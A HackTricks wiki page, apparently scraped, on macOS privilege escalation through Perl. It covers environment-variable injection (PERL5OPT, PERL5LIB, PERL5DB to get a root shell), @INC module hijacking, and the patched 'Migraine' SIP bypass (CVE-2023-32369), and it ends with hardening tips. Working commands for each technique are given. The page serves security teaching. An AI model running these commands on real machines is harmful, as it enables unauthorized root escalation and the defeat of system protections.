@@ -1,0 +1,129 @@
+---
+title: "macOS Perl Applications Injection"
+source: hacktricks.wiki
+source_url: https://hacktricks.wiki/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-perl-applications-injection.html
+fetched_at: 2026-09-20T09:50:19Z
+license: unspecified
+category: misc
+---
+
+## Via `PERL5OPT` & `PERL5LIB` env variable
+
+`PERL5OPT` & `PERL5LIB` env variable
+Using the env variable **`PERL5OPT`** it’s possible to make **Perl** execute arbitrary commands when the interpreter starts (even **before** the first line of the target script is parsed).
+
+For example, create this script:
+
+```
+#!/usr/bin/perl
+print "Hello from the Perl script!\n";
+```
+Now **export the env variable** and execute the **perl** script:
+
+```
+export PERL5OPT='-Mwarnings;system("whoami")'
+perl test.pl # This will execute "whoami"
+```
+Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):
+
+```
+#!/usr/bin/perl
+package pmod;
+system('whoami');
+1; # Modules must return a true value
+```
+And then use the env variables so the module is located and loaded automatically:
+
+```
+PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
+```
+### Other interesting environment variables
+
+-
+**`PERL5DB`** – when the interpreter is started with the**`-d`** (debugger) flag, the content of`PERL5DB` is executed as Perl code*inside* the debugger context.
+ If you can influence both the environment**and** the command-line flags of a privileged Perl process you can do something like:```
+export PERL5DB='system("/bin/zsh")'
+sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
+```
+-
+**`PERL5SHELL`** – on Windows this variable controls which shell executable Perl will use when it needs to spawn a shell. It is mentioned here only for completeness, as it is not relevant on macOS.
+
+Although `PERL5DB` requires the `-d` switch, it is common to find maintenance or installer scripts that are executed as *root* with this flag enabled for verbose troubleshooting, making the variable a valid escalation vector.
+
+## [Via dependencies (@INC abuse)](#via-dependencies-inc-abuse)
+
+It is possible to list the include path that Perl will search (**`@INC`**) running:
+
+```
+perl -e 'print join("\n", @INC)'
+```
+Typical output on macOS 13/14 looks like:
+
+```
+/Library/Perl/5.30/darwin-thread-multi-2level
+/Library/Perl/5.30
+/Network/Library/Perl/5.30/darwin-thread-multi-2level
+/Network/Library/Perl/5.30
+/Library/Perl/Updates/5.30.3
+/System/Library/Perl/5.30/darwin-thread-multi-2level
+/System/Library/Perl/5.30
+/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
+/System/Library/Perl/Extras/5.30
+```
+Some of the returned folders don’t even exist, however **`/Library/Perl/5.30`** does exist, is *not* protected by SIP and is *before* the SIP-protected folders. Therefore, if you can write as *root* you may drop a malicious module (e.g. `File/Basename.pm`) that will be *preferentially* loaded by any privileged script importing that module.
+
+Warning
+
+You still need **root** to write inside `/Library/Perl` and macOS will show a **TCC** prompt asking for *Full Disk Access* for the process performing the write operation.
+
+For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` containing attacker-controlled code.
+
+## [SIP bypass via Migration Assistant (CVE-2023-32369 “Migraine”)](#sip-bypass-via-migration-assistant-cve-2023-32369-migraine)
+
+In May 2023 Microsoft disclosed **CVE-2023-32369**, nick-named **Migraine**, a post-exploitation technique that allows a *root* attacker to completely **bypass System Integrity Protection (SIP)**.
+
+The vulnerable component is **`systemmigrationd`**, a daemon entitled with **`com.apple.rootless.install.heritable`**. Any child process spawned by this daemon inherits the entitlement and therefore runs **outside** SIP restrictions.[\[1\]](#references)
+
+Among the children identified by the researchers is the Apple-signed interpreter:[\[1\]](#references)
+
+```
+/usr/bin/perl /usr/libexec/migrateLocalKDC …
+```
+Because Perl honors `PERL5OPT` (and Bash honors `BASH_ENV`), poisoning the daemon’s *environment* is enough to gain arbitrary execution in a SIP-less context:[\[1\]](#references)[\[2\]](#references)
+
+```
+# As root
+launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'
+# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
+open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
+```
+When `migrateLocalKDC` runs, `/usr/bin/perl` starts with the malicious `PERL5OPT` and executes `/private/tmp/migraine.sh` *before SIP is re-enabled*. From that script you can, for instance, copy a payload inside **`/System/Library/LaunchDaemons`** or assign the `com.apple.rootless` extended attribute to make a file **undeletable**.
+
+Apple fixed the issue in macOS **Ventura 13.4**, **Monterey 12.6.6** and **Big Sur 11.7.7**, but older or un-patched systems remain exploitable.[\[1\]](#references)
+
+## [Hardening recommendations](#hardening-recommendations)
+
+1. **Clear dangerous variables** – privileged launchdaemons or cron jobs should start with a pristine environment (`launchctl unsetenv PERL5OPT` ,`env -i` , etc.).
+2. **Avoid running interpreters as root** unless strictly necessary. Use compiled binaries or drop privileges early.
+3. **Vendor scripts with `-T` (taint mode)** so that Perl ignores`PERL5OPT` and other unsafe switches when taint checking is enabled.
+4. **Keep macOS up to date** – “Migraine” is fully patched in current releases.
+
+## [References](#references)
+
+- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)
+
+Learn & practice AWS Hacking:**HackTricks Training AWS Red Team Expert (ARTE)**
+
+Learn & practice GCP Hacking: **HackTricks Training GCP Red Team Expert (GRTE)**
+
+Learn & practice Az Hacking: **HackTricks Training Azure Red Team Expert (AzRTE)**
+
+Browse the [**full HackTricks Training catalog**](https://hacktricks-training.com/courses/).
+
+## Support HackTricks
+
+- Check the
+[**subscription plans**](https://github.com/sponsors/carlospolop)!
+**Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f), the [**telegram group**](https://t.me/peass), **follow** [**@hacktricks_live**](https://twitter.com/hacktricks_live) on **X/Twitter**, or check the [**LinkedIn page**](https://www.linkedin.com/company/hacktricks/) and [**YouTube channel**](https://www.youtube.com/@hacktricks_LIVE).
+**Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
